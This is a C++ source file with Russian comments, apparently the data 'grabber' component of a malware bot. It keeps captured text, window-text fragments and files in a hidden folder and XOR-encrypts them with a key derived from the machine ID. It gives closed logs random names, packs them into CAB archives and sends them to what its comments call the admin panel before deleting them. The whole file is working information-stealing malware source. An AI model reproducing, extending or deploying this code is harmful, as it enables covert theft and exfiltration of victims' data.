//---------------------------------------------------------------------------

#pragma hdrstop

#include "BotCore.h"
#include "Grabbers.h"
#include "Utils.h"
#include "StrConsts.h"
#include "CabPacker.h"
#include "Loader.h"

//---------------------------------------------------------------------------

// Пароль шифрования данных грабера
char GrabberPassword[5] = {0};

const char* GrabbersWorkWolder = "NGWF";
const char* GrabbersFileExt    = ".ngdf";

//-------------------------------------------
//  GetGrabbersPath - Функция возвращет имя
//                рабочего каталога грабера
//-------------------------------------------
string GetGrabbersPath()
{
	return BOT::MakeFileName(GrabbersWorkWolder, NULL);
}

//-------------------------------------------
//  GetGrabberFileName - Функция создаёт имя
//                       файла грабера.
//-------------------------------------------
string GetGrabberFileName(const string& GrabberName)
{
	string Tmp = (!GrabberName.IsEmpty()) ? GrabberName : Random::RandomString2(10, 'A', 'Z');
	DWORD Hash = Tmp.Hash();
	string ShortName;
    ShortName.LongToStr(Hash);
	ShortName += GrabbersFileExt;
	string Name = GetGrabbersPath();
	Name += ShortName;
	return Name;
}


//-------------------------------------------
// Функция генерирует пароль шифрования
// данных грабера
//-------------------------------------------
PCHAR MakeGrabberFilePassword()
{
	if (!GrabberPassword[0])
	{
		// Генерируем пароль
		m_memset(GrabberPassword, 0, sizeof(GrabberPassword));
		PCHAR ID = MakeMachineID();
		DWORD Hash = STRA::Hash(ID);
		string Temp;
		WORD NW = LOWORD(Hash) + HIWORD(Hash);
		Temp.Format("%X", NW);
		m_memcpy(GrabberPassword, Temp.t_str(), 4);
    }
	return GrabberPassword;
}





// Описание заголовка файла грабера
#pragma pack(push, 1)
struct TGrabberFileHead
{
	DWORD Signature;    // Сигнатура файла
	DWORD Version;      // Версия файла
	DWORD Type;         // Тип файла
	DWORD Flags;        // Флаги файла
	DWORD FlagsEx;      // Дополнительные флаги
	DWORD PID;          // Идентификатор процесса создавшего лог
	bool  Closed;       // Признак того, что лог закрыт и его можно отправлять
	bool  SendAsCAB;    // Признак необходимости отправки  лога CAB архивом
	DWORD SendInterval; // Интервал времени, с момента последнего изменения
						// файла, по истечению которого лог будет отправлен
};
#pragma pack(pop)


// описание заголовка блока данных грабера
#pragma pack(push, 1)
struct TGrabberBlockHead
{
	DWORD Signature;  // Сигнатура блока
	DWORD Type;       // Тип данных блока
	DWORD DataSize;   // Размер данных блока
	HWND  Wnd;        // Идентификатор окна текстового лога
};
#pragma pack(pop)




//=============================================================================
//  TGrabberFile - Базовый класс для работы с файлом
//                 грабера
//=============================================================================
TGrabberFile::TGrabberFile(const string& GrabberName, const char* FileName, bool AutoActivate)
{
	Initialize(GrabberName, FileName, AutoActivate);
}

TGrabberFile::TGrabberFile(const string& GrabberName)
{
	Initialize(GrabberName, NULL, false);
}


TGrabberFile::~TGrabberFile()
{
	CloseFile();
	delete FBlocks;
}

//-------------------------------------------
//  Функция инициализирует данные файла
//-------------------------------------------
void TGrabberFile::Initialize(const string& GrabberName, const char* FileName, bool AutoActivate)
{
	FBlocks = new TBotCollection();
	FGrabberName = GrabberName;
	if (STRA::IsEmpty(FileName))
		FFileName = GetGrabberFileName(GrabberName);
	else
		FFileName = FileName;
	FPassword = MakeGrabberFilePassword();
	FStream = NULL;

	FPID  = Bot->PID();
	FType = 0;
	FClosed = false;
	FSendAsCAB = false;
	FSendInterval = GRABBER_SEND_INTERVAL;
	FIsEmpty = false;

	if (AutoActivate) Activate(NULL);
}


//-------------------------------------------
// Функция возвращет истину если в данный
// момент фал открыт
//-------------------------------------------
bool TGrabberFile::Active()
{
	return FStream != NULL;
}


//-------------------------------------------
// CloseLog - Функция закрывает лог.
// После закрытия лога файл лога не будет
// доступен по имени грабера
//-------------------------------------------
void TGrabberFile::CloseLog()
{
	if (!Active()) Open();
	if (!Active()) return;

	// Помечаем лог как готовый и закрываем его
	FClosed = true;
	UpdateFileHeader(false);
	CloseFile();

	// Переименовываем файл. Создаём случайное имя
	string NewName;
	do
	{
		NewName = GetGrabbersPath();
		NewName += Random::RandomString2(9, 'a', 'z');
		NewName += GrabbersFileExt;
	}
	while (File::IsExists(NewName.t_str()));

	pMoveFileA(FFileName.t_str(), NewName.t_str());
	FFileName = NewName;
}


//-------------------------------------------
// CloseFile - Функция закрывает открытый
//             файл
//-------------------------------------------
void TGrabberFile::CloseFile()
{
	if (FStream)
	{
		delete FStream;
		FStream = NULL;
    }
}

//-------------------------------------------
//  Create - Функция создаёт файл грабера
//-------------------------------------------
bool TGrabberFile::Create()
{
	// Закрываем открытый файл
	CloseFile();

	// Открываем файл
	TBotFileStream *Stream = new TBotFileStream(FFileName.t_str(), fcmCreate | fcmReadWrite);
	if (!Stream->Valid())
	{
		delete Stream;
		return false;
	}

    // Файл успешно создан
	FStream = Stream;
	if (!UpdateFileHeader(true))
	{
		// В случае ошибки закрываем файл и удаляем его
		CloseFile();
		pDeleteFileA(FFileName.t_str());
    }

	return FStream != NULL;
}


//-------------------------------------------
// Open - Функция открывает ранее созданный
//        файл грабера
//-------------------------------------------
bool TGrabberFile::Open()
{
	// Закрываем открытый файл
	CloseFile();

	// Открываем файл
	TBotFileStream *Stream = new TBotFileStream(FFileName.t_str(), fcmReadWrite);
	if (!Stream->Valid())
	{
		delete Stream;
		return false;
	}

	FStream = Stream;
	// Файл успешно создан, читам заголовок
	TGrabberFileHead H;
	ClearStruct(H);

	bool Result = FStream->Read(&H, sizeof(H)) == sizeof(H);
	if (Result)
	{
		// Проверяем сигнатуру
		Result = H.Signature == GRABBER_FILE_SIGNATURE;

		// Проверяем версию
		if (Result)
			Result = H.Version == GRABBER_FILE_VERSION;

		if (Result)
		{
			FType         = H.Type;
			FClosed       = H.Closed;
			FSendAsCAB    = H.SendAsCAB;
			FSendInterval = H.SendInterval;
			FPID          = H.PID;

			// Читаем имя грабера
			Result = ReadSizedString(FGrabberName);

			// Запоминаем позицию начала блоков данных
			FBlocksStart = FStream->Position();
		}
	}

	if (!Result)
		CloseFile();

	return Result;
}

//-------------------------------------------
//  Activate - Функция открывает файл грабера.
//  Если его нет, то он будет автоматически
//  создан.
//  Created - Укзатель на переменную, куда
//  будет записн признак того, что файл создан
//-------------------------------------------
bool TGrabberFile::Activate(bool* Created)
{
	if (Created) *Created = false;
	bool Result = Open();
	if (!Result)
	{
		Result = Create();
		if (Created) *Created = Result;
    }
	return Result;
}


//-------------------------------------------
// CanSend - Функция возвращает истину если
// файл можно отправить.
//
// OpenFile -  указание того, перед проверкой
// необходимо открыть файл
//-------------------------------------------
bool TGrabberFile::CanSend(bool OpenFile)
{
	if (!Active() && OpenFile)
		Open();
	if (!Active()) return false;

	// Проверяем признак закрытого лога
	if (FClosed) return true;

	// проверяем время последнего изменения файла
	if (FSendInterval)
	{
		DWORD LastWriteInterval = File::LastWriteTime(FStream->Handle());
		if (LastWriteInterval && LastWriteInterval >= FSendInterval)
			return true;
	}

	return false;
}

//-------------------------------------------
//  DeleteFile - Функция закрывает файл и
//               удаляет его
//-------------------------------------------
void TGrabberFile::DeleteFile()
{
	CloseFile();
	pDeleteFileA(FFileName.t_str());
}

//-------------------------------------------
// UpdateFileHeader - функция обновляет
// заголовок файла грабера
//-------------------------------------------
bool TGrabberFile::UpdateFileHeader(bool WriteName)
{
	if (!Active()) return false;

	TGrabberFileHead H;
	ClearStruct(H);

	H.Signature    = GRABBER_FILE_SIGNATURE;
	H.Version      = GRABBER_FILE_VERSION;
	H.Type         = FType;
	H.PID          = FPID;
	H.Closed	   = FClosed;
	H.SendAsCAB    = FSendAsCAB;
	H.SendInterval = FSendInterval;

    FStream->Seek(0, SO_BEGIN);

	bool Result = FStream->Write(&H, sizeof(H)) == sizeof(H);

	if (Result && WriteName)
		Result = WriteSizedString(FGrabberName);

	return Result;
}


//-------------------------------------------
//  WriteData - Функция записывает блок
//              данных.
//-------------------------------------------
bool TGrabberFile::WriteData(LPVOID Data, DWORD Size, bool WriteSize, bool AllocMemForCrypt)
{
	if (!FStream) return false;
	bool Result = true;
    if (WriteSize)
		Result = FStream->Write(&Size, sizeof(Size)) == sizeof(Size);

	if (Result && Size)
	{
		// Копируем данные во временный буфер и шифруем их
		LPVOID CryptedBuf = Data;
		DWORD  CryptedSize = (AllocMemForCrypt) ? Size : 0;
		TMemory M(CryptedSize);
		if (AllocMemForCrypt)
		{
			M.Write(Data, Size);
			CryptedBuf = M.Buf();
		}

		// Шифруем данные
		XORCrypt::Crypt(FPassword, (LPBYTE)CryptedBuf, Size);
		// Записываем
		Result = FStream->Write(CryptedBuf, Size) == Size;
	}

	return Result;
}

//-------------------------------------------
//  Функция записывает строку с размером
//-------------------------------------------
bool TGrabberFile::WriteSizedString(const string &Str)
{
	return WriteData(Str.t_str(), Str.Length(), true, true);
}


//-------------------------------------------
//  ReadData - Функция читает блок данных
//  размером  DataSize в буфер Buf
//-------------------------------------------
bool TGrabberFile::ReadData(LPVOID Buf, DWORD DataSize)
{
	if (!FStream) return false;
	if (!DataSize) return true;

	bool Result = FStream->Read(Buf, DataSize) == DataSize;
	if (Result)
	{
		// Расшифровываем данные
		XORCrypt::Crypt(FPassword, (LPBYTE)Buf, DataSize);
	}
	return Result;
}

//-------------------------------------------
//  Функция читаем строку указанного размера
//-------------------------------------------
bool TGrabberFile::ReadString(DWORD StringSize, string &Str)
{
	if (!FStream) return false;
	Str.SetLength(StringSize);
	bool Result = ReadData(Str.t_str(), StringSize);
	if (!Result) Str.Clear();
	return Result;
}

//-------------------------------------------
//  Функция читаем строку перед которой
//  записан её размер
//-------------------------------------------
bool TGrabberFile::ReadSizedString(string &Str)
{
	if (!FStream) return false;
	DWORD Size;
	bool Result = FStream->Read(&Size, sizeof(Size)) == sizeof(Size);
	if (Result)
		Result = ReadString(Size, Str);
	return Result;
}

//-------------------------------------------
// SetSendInterval - Функция задаёт интервал
//  ожидания после поледней записи до
//  отправки лога
//  Значение должно задаваться либо перед
//  созданием лога, либо после открытия или
//  создания
//-------------------------------------------
void TGrabberFile::SetSendInterval(DWORD Interval) /* миллисекунд */
{
	FSendInterval = Interval;
	UpdateFileHeader(false);
}

//-------------------------------------------
// SetSendAsCAB Функция задаёт необходимость
// отправки лога CAB архивом
//-------------------------------------------
void TGrabberFile::SetSendAsCAB(bool SendAsCAB)
{
	FSendAsCAB = SendAsCAB;
	UpdateFileHeader(false);
}



//-------------------------------------------
// Функция добавляет текстовые данные
//-------------------------------------------
bool TGrabberFile::AddText(const string& Name, const string& Data)
{
	if (!Active() || Name.IsEmpty() || Data.IsEmpty())
		return false;
	TGrabberBlock B(this);
	return B.WriteText(Name, Data, false);
}

//-------------------------------------------
//  Функция добавляет часть текстовых данных
//-------------------------------------------
bool TGrabberFile::AddTextPart(HWND Wnd, const string& Name, const string& Data)
{
	if (!Active() || Name.IsEmpty() || Data.IsEmpty())
		return false;
	TGrabberBlock B(this);
	B.FWND = Wnd;
	return B.WriteText(Name, Data, true);
}

//-------------------------------------------
// функция добавляет файл в лог
//-------------------------------------------
bool TGrabberFile::AddFile(const string& Name, const string& FileName, PCHAR SubDir, PCHAR InternalName)
{
	TGrabberBlock B(this);
	return B.WriteFile(Name, FileName, SubDir, InternalName);
}


//-------------------------------------------
//  Функция загруает блоки данных
//-------------------------------------------
bool TGrabberFile::ReadBlocks()
{
	FIsEmpty = false;
	if (!Active()) return false;
	FBlocks->Clear();

	// Переходим к началу первого блока
	FStream->Seek(FBlocksStart, SO_BEGIN);

	while (true)
	{
		TGrabberBlock* Block = new TGrabberBlock(this);

		// читаем данные
		if (!Block->Read())
		{
			// Ошибка чтения блока.
			delete Block;
			break;
		}

		if (!Block->FIgnoreBlock)
			Block->SetOwner(FBlocks);
		else
			delete Block;
    }

	FIsEmpty = FBlocks->Count() == 0;

	return FBlocks->Count() > 0;
}

//-------------------------------------------
//  Функция упаковывает текстовые блоки
//-------------------------------------------
string TGrabberFile::DoPackTextData()
{
	string Result;
	int Count = FBlocks->Count();
	if (Count > 0)
	{
		TBotStrings S;
        S.ValueDelimeter = ": ";
		for (int i = 0; i < Count; i++)
		{
			TGrabberBlock* Block = (TGrabberBlock*)FBlocks->Items(i);;
			if (Block->FDataType != GRABBER_DATA_TEXT && Block->FDataType != GRABBER_DATA_TEXTPART )
				continue;
            S.AddValue(Block->FName, Block->FAsString);
		}
		if (S.Count() > 0)
			Result = S.GetText();
    }

	return Result;
}

//-------------------------------------------
//  Функция добавляет файлы лога в каб архив
//-------------------------------------------
bool TGrabberFile::DoPackFilesToCab(LPVOID Cab)
{
	bool Result = false;
	for (int i = 0; i < FBlocks->Count(); i++)
	{
		TGrabberBlock* Block = (TGrabberBlock*)FBlocks->Items(i);;
		if (Block->FDataType != GRABBER_DATA_FILE)
			continue;
		// Добавляем файл
		if (AddFileToCab(Cab, Block->FTempFileName.t_str(), Block->FInternalFileName.t_str()))
        	Result = true;
	}
	return Result;
}



//-------------------------------------------
// PackToCAB - Функция запаковывает данные
//             в каб архив.
// В случае успеха функция возвращает имя
// фала с каб архивом
//-------------------------------------------
string TGrabberFile::PackToCAB()
{
	string FileName;
	if (ReadBlocks())
	{
		FileName = File::GetTempName2A();
		LPVOID Cab = CreateCab(FileName.t_str());
		if (Cab)
		{
			bool Result = false;
			// Запаковываем текстовые данные
			string TextLog = DoPackTextData();
			if (!TextLog.IsEmpty())
			{
				Result = AddStringToCab(Cab, TextLog, GetStr(StrLogFileTextData));

            }

			// Добавляем файлы
			if (DoPackFilesToCab(Cab))
            	Result = true;

            // Закрываем каб
			CloseCab(Cab);

			// В случае отрицательног результата удаляем каб
			if (!Result)
			{
				pDeleteFileA(FileName.t_str());
                FileName.Clear();
            }
		}
    }

    return FileName;
}

//-------------------------------------------
//  Функция возвращает блок по имени
//-------------------------------------------
TGrabberBlock* TGrabberFile::GetBlockByName(const string& Name)
{
	for (int i = FBlocks->Count() - 1; i >= 0 ; i--)
	{
		TGrabberBlock* Block = (TGrabberBlock*)FBlocks->Items(i);
		if (Block->FName == Name)
			return Block;
	}
	return NULL;
}


//-------------------------------------------
// SendLog - Функция отправляет лог в админку
//-------------------------------------------
bool TGrabberFile::SendLog(bool DeleteLog)
{
	if (!Active()) return false;

	// тправляем CAB архив
	bool CabSended = false;
	if (FSendAsCAB)
	{
		string CAB = PackToCAB();
		if (!CAB.IsEmpty())
		{
			// Лoг упакован. Отправляем
			CabSended = DataGrabber::SendCab(NULL, CAB.t_str(), FGrabberName.t_str(), NULL);

			pDeleteFileA(CAB.t_str());
        }
	}
	else
		CabSended = true;

	bool Result = CabSended;

	if (FIsEmpty || (Result && DeleteLog))
		DeleteFile();

	return Result;
}





//=============================================================================
//  TGrabberBlock - Блок данных грабера
//=============================================================================
TGrabberBlock::TGrabberBlock(TGrabberFile* File)
	: TBotCollectionItem(NULL)
{
	Initialize();
	FFile = File;
}

TGrabberBlock::~TGrabberBlock()
{
	Clear();
}

//-------------------------------------------
// Функция инициализирует переменные класса
//-------------------------------------------
void TGrabberBlock::Initialize()
{
	FDataSize = 0;
	FDataType = 0;
}


//-------------------------------------------
//  Write - Функция записывает данные блока
//          в файл
//-------------------------------------------
bool TGrabberBlock::Write(LPVOID Data, DWORD DataSize, bool AllocMemForCrypt)
{
	if (!FFile || !FFile->Active())
		return false;

	// переходим в конец файла
	FFile->FStream->Seek(0, SO_END);

	// Записываем заголовок блока
	TGrabberBlockHead H;
	H.Signature = GRABBER_FILE_BLOCK_SIGNATURE;
	H.Type      = FDataType;
	H.DataSize  = DataSize;
	H.Wnd       = FWND;

	// Пишем заголовок
	bool Result = FFile->FStream->Write(&H, sizeof(H)) == sizeof(H);

	// записываем имя блока
	if (Result)
		Result = FFile->WriteSizedString(FName);

	if (Result && FDataType == GRABBER_DATA_FILE)
	{
		// В случае записи файла пишем имена файлов
		Result = FFile->WriteSizedString(FFileName) &&
				 FFile->WriteSizedString(FInternalFileName);
	}

	// Пишем данные
	if (Result)
		Result = FFile->WriteData(Data, DataSize, false, AllocMemForCrypt);

	return Result;
}


//-------------------------------------------
// Read - Функция читает данные блока
//-------------------------------------------
bool TGrabberBlock::Read()
{
	if (!FFile || !FFile->Active())
		return false;

	Clear();

	// Читаем заголовки блока
	TGrabberBlockHead H;
	ClearStruct(H);

	// Читаем заголовок
	bool Result = FFile->FStream->Read(&H, sizeof(H)) == sizeof(H);

    // Проверяем сигнатуру блока
	if (Result)
		Result = H.Signature == GRABBER_FILE_BLOCK_SIGNATURE;

	// Читаем имя блока
	if (Result)
		Result = FFile->ReadSizedString(FName);


	if (Result && H.Type == GRABBER_DATA_FILE)
	{
		// В случае чтения файла читаем имена файлов
		Result = FFile->ReadSizedString(FFileName) &&
				 FFile->ReadSizedString(FInternalFileName);
	}

	// Читаем данные
	if (Result)
	{
		FDataType = H.Type;
		FDataSize = H.DataSize;
		FWND      = H.Wnd;

		Result = ReadBlockData();
    }


	return Result;
}

//-------------------------------------------
// Функция читает данные блока
//-------------------------------------------
bool TGrabberBlock::ReadBlockData()
{
	if (!FDataSize)
	{
		// Пустые блоки игнорируем
		FIgnoreBlock = true;
		return true;
	}

	switch (FDataType)
	{
		// Читаем текстовый блок
		case GRABBER_DATA_TEXT:     return DoReadTextData();
		case GRABBER_DATA_TEXTPART: return DoReadTextData();
		case GRABBER_DATA_FILE:     return DoReadFileData();
	}

	// Нет специализированного обработчика, читаем как обычные бинарные данные
	// Для удобаства преобразований добавляем ноль в конце
	FAsBlob = (LPBYTE)MemAlloc(FDataSize + 1);
	*(FAsBlob + FDataSize) = 0;
	return FFile->ReadData(FAsBlob, FDataSize);
}


//-------------------------------------------
//  Функция читает текстовые данные
//-------------------------------------------
bool TGrabberBlock::DoReadTextData()
{
	// При чтении текстовых данных проверяем блоки на существование
	// подобного блока.
	bool Result = FFile->ReadString(FDataSize, FAsString);
	if (Result)
	{
		TGrabberBlock* Block = FFile->GetBlockByName(FName);
		if (Block)
		{
			if (Block->FDataType == GRABBER_DATA_TEXT && FDataType == GRABBER_DATA_TEXT)
			{
				// В случае если это два текстовых блока, заменяем
				// старые данные новыми
				FIgnoreBlock = true;
				Block->FAsString = FAsString;
			}
			else
			if (Block->FDataType == GRABBER_DATA_TEXTPART && FDataType == GRABBER_DATA_TEXTPART)
			{
				FIgnoreBlock = true;
				if (!FWND || Block->FWND == FWND)
					Block->FAsString += FAsString;
				else
				{
					Block->FWND = FWND;
					Block->FAsString = FAsString;
                }
			}
		}
	}
	return Result;
}

//-------------------------------------------
// Функция читает данные файла
//-------------------------------------------
bool TGrabberBlock::DoReadFileData()
{
	LPVOID Buf = MemAlloc(FDataSize);
	bool Result = FFile->ReadData(Buf, FDataSize);
	if (Result)
	{
		TGrabberBlock* Block = FFile->GetBlockByName(FName);
		if (Block)
		{
			// такой блок уже существует
			FIgnoreBlock = true;
            File::WriteBufferA(Block->FTempFileName.t_str(), Buf, FDataSize);
		}
		else
		{
			FTempFileName = File::GetTempName2A();
			File::WriteBufferA(FTempFileName.t_str(), Buf, FDataSize);
        }
    }

	MemFree(Buf);
	return Result;
}



//-------------------------------------------
//  Clear - Функция очищает данные блока
//-------------------------------------------
void TGrabberBlock::Clear()
{
	if (FAsBlob) MemFree(FAsBlob);
	FName.Clear();
	FFileName.Clear();
	FInternalFileName.Clear();
	FAsString.Clear();
	FDataSize = 0;
	FDataType = 0;
	FWND = 0;
	FIgnoreBlock = false;
	if (!FTempFileName.IsEmpty())
	{
		pDeleteFileA(FTempFileName.t_str());
		FTempFileName.Clear();
	}
}

//-------------------------------------------
//  WriteText - Функция записывает в файл
//              текстовый блок
//-------------------------------------------
bool TGrabberBlock::WriteText(const string& Name, const string& Data, bool IsTextPart)
{
	Clear();
	FName     = Name;
	if (IsTextPart)
		FDataType = GRABBER_DATA_TEXTPART;
	else
		FDataType = GRABBER_DATA_TEXT;
	return Write(Data.t_str(), Data.Length(), true);
}

//-------------------------------------------
//  Функция добавляет текстовый блок в лог
//-------------------------------------------
bool TGrabberBlock::WriteFile(const string& Name, const string& FileName, PCHAR SubDir, PCHAR InternalName)
{
	if (!FFile || !FFile->Active())
		return false;

	Clear();

	bool Result = false;
	LPBYTE Buf  = File::ReadToBufferA(FileName.t_str(), FDataSize);
	if (Buf)
	{
		FName = Name;

		// Создаём имена файлов
		FFileName = File::ExtractFileNameA(FileName.t_str(), false);

		if (FName.IsEmpty())
			FName = FFileName;

		// Создаём имя для каб архива
		if (!STRA::IsEmpty(InternalName) || !STRA::IsEmpty(SubDir))
		{

			if (STRA::IsEmpty(InternalName))
				InternalName = FFileName.t_str();

			FInternalFileName = CombineFileName(SubDir, InternalName);
		}


		FDataType = GRABBER_DATA_FILE;
		Result    = Write(Buf, FDataSize, false);

		MemFree(Buf);
    }
    return Result;
}


//=============================================================================
//  TGrabberFileSender Класс отправки логов
//=============================================================================
TGrabberFileSender::TGrabberFileSender()
{
	FWorkPath = GetGrabbersPath();
	FMask = "*";
	FMask += GrabbersFileExt;
}

TGrabberFileSender::~TGrabberFileSender()
{

}


void LogSenderSearchFiles(PFindData Search, PCHAR FileName, LPVOID Data, bool &Cancel)
{
	((TBotStrings*)Data)->Add(FileName);
}


void TGrabberFileSender::SendFiles()
{
	// Получаем список существующих логов
	TBotStrings Files;
	SearchFiles(FWorkPath.t_str(), FMask.t_str(), false, FA_ANY_FILES, &Files, LogSenderSearchFiles);

	// Отправляем логи
	for (int i = 0; i < Files.Count(); i++)
	{
		string FileName = Files[i];
		TGrabberFile File("", FileName.t_str(), false);
		if (File.CanSend(true))
			File.SendLog(true);
	}
}
